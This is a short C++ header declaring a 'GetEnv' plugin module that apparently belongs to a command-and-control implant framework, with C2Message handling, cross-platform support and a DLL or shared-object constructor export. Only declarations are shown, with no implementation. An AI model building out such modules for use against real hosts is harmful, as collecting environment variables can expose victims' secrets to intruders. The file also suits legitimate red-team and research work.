#pragma once

#include "ModuleCmd.hpp"

class GetEnv : public ModuleCmd
{
public:
    GetEnv();
    ~GetEnv();

    std::string getInfo();

    int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
    int process(C2Message& c2Message, C2Message& c2RetMessage);
    int osCompatibility()
    {
        return OS_LINUX | OS_WINDOWS;
    }

private:
    std::string listEnv();
};

#ifdef _WIN32
extern "C" __declspec(dllexport) GetEnv* GetEnvConstructor();
#else
extern "C" __attribute__((visibility("default"))) GetEnv* GetEnvConstructor();
#endif
